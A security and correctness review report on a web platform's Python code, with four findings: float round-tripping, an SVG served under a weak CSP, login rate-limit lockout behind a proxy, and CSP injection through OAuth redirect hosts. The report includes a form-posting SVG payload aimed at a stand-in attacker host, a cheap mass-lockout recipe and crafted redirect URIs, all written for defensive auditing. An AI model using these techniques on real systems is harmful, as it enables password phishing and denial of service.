## Method

Three reviewers each read the unit through a different lens and produced 17 candidate findings between them:

- correctness and data flow;
- security, covering headers, CSRF, rate limits and untrusted content;
- contracts and drift, covering docstrings, docs and dead code.

One candidate was itself a list of eight items its author had already refuted. This report is the refutation round. For each candidate:

- the cited code was re-read at the sha;
- the claim was reproduced end to end where it could be. That meant `pytest` probe files kept outside the repository, using the repository's own `World` harness (`tests/human_harness.py`) and `seed` (`tests/test_web_board.py:29`) against a real `create_app` through Starlette's `TestClient`. Where an end-to-end run was not possible, `python3 -I` calls on the real functions were used;
- the behaviour was checked against recorded decisions: specs, plans, test-case overviews, `DESIGN.md` and `docs/PLATFORM.md`. A documented decision refutes a finding unless its premise is false.

Two candidates (`GET /act/resume/edit` calling `request_resume`) appeared once as a finding and once in the refuted list, so they were merged. Candidates that hold only in part were narrowed, and the dropped part is listed under **Refuted**. Severity follows RULES §6:

- **P1**: a bug that changes what a run does or produces under ordinary use.
- **P2**: a wrong behaviour shown to the person, or a security risk that needs a precondition.
- **P3**: cleanup, robustness, cosmetics or docs.

Tiers follow the constitution's merge rule (`.specify/memory/constitution.md:244-254`):

- **A**: needs the maintainer's yes, because it modifies a requirement.
- **B**: a fix or a user-visible change that the development lead merges after the verifier.
- **C**: docs, docstrings or dead code.

Both files are HOT (`web*.py`), so every finding below is HOT unless it says otherwise.

### AR09-01 · P1 · A number parameter written with a dot that Python prints in exponent form (0.00001, 1e20 as 100000000000000000000.0) is sent to the run as text, and the resume-edit page refuses the same value

*Candidate 1. Confirmed end to end. A second path the reviewer did not name was also found.*

**Evidence**
- `web_board.py:911-925` `params_text` writes a float with `str(value)` (:917-918). Python prints 1e-05, 1e+16 and 1e+20 in exponent form with no `.`.
- `web_board.py:879` `PARAM_FLOAT` is `^-?\d+\.\d+([eE][-+]?\d+)?\Z`, which needs a `.`. So `parse_params` (:883-908) falls through :904 to :907 and keeps `'1e-05'` as a `str`. The docstring at :912 promises that the box "reads back" the same way.
- Launch path:
  - `web_launch.py:33-35` `_typed` turns the box `0.00001` into the float `1e-05`;
  - `web_launch.py:54` sends that through `params_text`;
  - `web.py:980-981` `launch_post` always parses the result with `parse_params`;
  - `web.py:986-989` hands it to `request_launch`, which does not coerce types (`actions/__init__.py:1394`, whose only check on `params` is the dict check at :1416-1417).
- Re-run path: `web.py:797-798` writes an earlier run's unknown-to-schema params with `params_text`, and the same round trip applies.
- Downstream: `abf_station/launch.py:437-451` `_yaml_scalar` writes a `str` quoted, so `params.yaml` gets `pval: "1e-05"`. That is a String to Nextflow, for a parameter the schema types `number`. nf-schema refuses a string for a number at run start (not run here: no Nextflow in this read-only review). The person has already pressed Send by then.
- Resume-edit path, not in the candidate:
  - `web_launch.py:291-294` `_shown(1e-05)` fills the box with `1e-05`;
  - `web.py:720-723` `edit_post` runs `wrong_type` on every box;
  - `web_launch.py:372-377` `wrong_type('1e-05', ['number'])` is `True`.
  So "Edit and resume" of a run first launched with `pval: 1e-05` is refused with `re_bad_type` until the person retypes the value as `0.00001`.

**Reproduction** (run on this sha)
- `POST /launch` with `p.pval=0.00001` against a schema typing `pval` as `number` (`actions.pipeline_files` and `request_launch` monkeypatched to capture): `request_launch` received `params={'pval': '1e-05'}`. With `p.pval=0.0001` it received `{'pval': 0.0001}`.
- `params_text` followed by `parse_params`:
  - `1e-05` → `'1e-05'` (str);
  - `1e20` → `'1e+20'` (str);
  - `1e16` → `'1e+16'` (str);
  - `2.5e-05` → `2.5e-05` (float);
  - `1e15` → float.
- `web_launch.edit_params_block(..., first={'pval': 1e-05})` gives a box value of `1e-05`, and `wrong_type` of that is `True`.

**Fix**
- Accept the exponent form as a number on both sides. Widen `PARAM_FLOAT` to `^-?(\d+\.\d+|\d+(\.\d+)?[eE][-+]?\d+)\Z`; `web_launch._typed` and `typed_like` reuse it.
- Write floats with `repr()` in `params_text` and `_shown`. `inf` and `nan` are already text and should stay quoted text on purpose.

**RED test**
- `tests/test_web_launch_params.py::test_exponent_float_round_trips_as_number`:
  - `params_text({'x': 1e-05})` read back by `parse_params` gives the float `1e-05`;
  - `POST /launch` with `p.pval=0.00001` and a `number` schema sends `{'pval': 1e-05}`;
  - `POST /act/resume` with the box `1e-05` is not refused.

HOT: yes (`web_board.py`, `web_launch.py`, `test_web_*`). Tier: **B**.

### AR09-04 · P2 · A workflow-diagram SVG from any public repository is served on the platform origin with a CSP that has no `form-action`, `sandbox` or `base-uri`; opened as a document, it can show a styled form that posts anywhere

*Candidate 7. Confirmed in code and by the pinned test. Narrowed: see Refuted R-4.*

**Evidence**
- `web.py:893-899` accepts any `owner/name`. `releases.py:16-26` checks only the shape.
- `abf_station/pipeline_files.py:244-262` fetches `docs/images/<name>` of that repository and only checks that `<svg` appears in the first 4 KB.
- `web.py:909-910` replaces the whole CSP for `image/svg+xml` with `default-src 'none'; style-src 'unsafe-inline'`. This drops the `form-action 'self'` and `base-uri 'none'` of every other page (`web.py:88`) and adds no `sandbox` and no `Content-Disposition`. `form-action` does not fall back to `default-src`.
- So when the image is opened as a top-level document, for example with "Open image in new tab" from `/launch`, which is a same-site navigation and carries the cookie, a third-party SVG can draw a styled `<foreignObject>` HTML form under the platform's address. That form can post a typed password to any host. It can also post to `/login`: `same_origin` (`web.py:239-249`) passes and `/login` has no CSRF token, so this is a login CSRF into another account of the same platform.
- Scripts stay blocked, and the person has to type and press.
- `tests/test_web_guided_launch_2.py:336` pins the exact weak header.

**Reproduction**
- World harness, with `actions.pipeline_files` returning an SVG whose `foreignObject` holds `<form action="https://evil.example/x">`.
- `GET /launch/diagram?pipeline=someone/lookalike&revision=1.0` → 200 `image/svg+xml`. The CSP is `default-src 'none'; style-src 'unsafe-inline'`, X-Frame-Options is `DENY`, there is no Content-Disposition, and the bytes are served unchanged.
- No browser was run in this read-only review.

**Fix**
- For SVG, send `default-src 'none'; style-src 'unsafe-inline'; form-action 'none'; base-uri 'none'; frame-ancestors 'none'; sandbox`.
- Optionally answer with `Content-Disposition: attachment` unless `Sec-Fetch-Dest: image`.
- Update `test_g04_svg` to the stricter header. That is a stricter assertion, not a weaker one.

**RED test**
- `tests/test_web_guided_launch_2.py::test_g04_svg_document_cannot_submit_forms`: the SVG CSP contains `form-action 'none'` and `sandbox`.

HOT: yes. Tier: **B** (it only makes the safety net stricter).

### AR09-05 · P2 · The per-address login limit keys on `request.client.host` behind a loopback-only bind: with a proxy that sends no `X-Forwarded-For`, everyone shares one bucket, and 20 cheap failures a minute lock every person out of `/login` and `/welcome`

*Candidate 8. Narrowed: the spoofing half holds only for a passthrough proxy or a local client; see Refuted R-5.*

**Evidence**
- `cli.py:66-71` refuses any non-loopback bind and names Tailscale Funnel as the proxy to put in front. `cli.py:81` calls `uvicorn.run(app, host, port, log_level="info")` with the defaults: in uvicorn 0.54.0 (`constraints.txt:39`), `proxy_headers=True` and `forwarded_allow_ips=None`, which falls back to `127.0.0.1`.
- `web.py:273` and `:348` key `by_ip` on `request.client.host`.
- `web.py:277-279` checks the limits before the password. So once `IP_FAIL_LIMIT=20` failures are live for that key, a right password also gets 429.
- `web.py:281-285` counts a too-long password (`> MAX_PASSWORD_CHARS`) as a failure without running scrypt, so the 20 failures cost the sender almost nothing.
- Outcomes measured with uvicorn's own `ProxyHeadersMiddleware(trusted_hosts="127.0.0.1")`:
  - no `X-Forwarded-For` → the client is `127.0.0.1` for every person;
  - `X-Forwarded-For: 10.0.0.7` passed through unchanged → `10.0.0.7`, chosen by the sender;
  - `spoofed, 203.0.113.9` from an appending proxy → `203.0.113.9`, the right address.
- So the result depends on what the proxy sends. A proxy that adds no header means one shared bucket: anyone who can reach the public address locks everyone out, renewable every 60 s.
- A passthrough proxy, or any local user or SSH-tunnel client talking to the port directly, can choose the key. That bypasses the 20-per-address cap on spraying many names. With fresh names, it can also fill `by_ip`/`by_name` to `MAX_TRACKED=10000`, after which `no_room` refuses every new name or address (`web.py:231-237`, `:278`).
- What Tailscale Funnel sends was not verified (no network in this review).

**Reproduction**
- World harness: 20 `POST /login` from one client with fresh names and 9999-character passwords → all 401. Then `ann` with the right password → **429**.
- The uvicorn middleware outcomes above were measured with a script on this VM.

**Fix**
- Run uvicorn with `proxy_headers=False` unless the operator names the proxy (`--trusted-proxy`, passed to `forwarded_allow_ips`).
- When the only address known is loopback, do not let the per-address bucket refuse a name that has no failures of its own: rely on the per-name limit plus a global shed that slows rather than refuses.
- State in `docs/PLATFORM.md` what the proxy must send.

**RED test**
- `tests/test_web_login_limits.py::test_shared_loopback_address_does_not_lock_out_a_right_password`: 20 failures from one address under fresh names, then a right password for an untouched name → 303.
- `::test_forwarded_for_is_not_trusted_by_default` (a `cli` test).

HOT: yes (`web.py`, `cli.py`, `docs/PLATFORM.md`). Tier: **B**. The maintainer should say which proxy is the supported one before the default changes.

### AR09-12 · P3 · The consent page pastes a self-registered client's redirect origin unescaped into the Content-Security-Policy header; `;` and `,` in the host add value-less directives or a second policy

*Candidate 9. Confirmed. No weakening was found, so this is hardening.*

**Evidence**
- `oauth.py:266-268` builds `redirect_origin` as `scheme://netloc` from the stored redirect URI. `web.py:1279` passes it to `_page(form_action=…)`, and `web.py:151-155` string-replaces it into the CSP.
- `oauth.py:83-93` `redirect_is_allowed` accepts any https host. The SDK's `OAuthClientMetadata` (pydantic `AnyUrl`) accepts `;`, `,` and `'` in the host; a space is refused.
- So `https://evil.example;sandbox;form-action/cb` gives `form-action 'self' https://evil.example;sandbox;form-action; frame-ancestors 'none'; …`.
- Only directives without a value can be added (`sandbox`, an empty `frame-ancestors` or `base-uri`, or a duplicate that is ignored), and a `,` only adds a second policy. All of these tighten. The only page affected is the attacker's own client's consent page.

**Reproduction**
- `python3 -I`: `OAuthClientMetadata(redirect_uris=["https://evil.example;sandbox;form-action/cb"], …)` keeps the URI, and `oauth.redirect_is_allowed` → `True`.
- `https://evil.example,x/cb` and `https://evil.example'x/cb` are accepted too.

**Fix**
- Refuse at registration (`oauth.redirect_is_allowed`) any host outside `[A-Za-z0-9.-]` or a bracketed IPv6 address.
- In `web.py`, re-serialise the origin as `scheme://hostname[:port]` before it enters the header.

**RED test**
- `tests/test_oauth_review.py::test_redirect_uri_with_csp_separators_is_refused` (registration). `oauth.py` and `test_oauth_*.py` are not HOT, so this half can be done outside the HOT lanes.

HOT: partly (`web.py` yes; `oauth.py` and `tests/test_oauth_review.py` no). Tier: **B**.
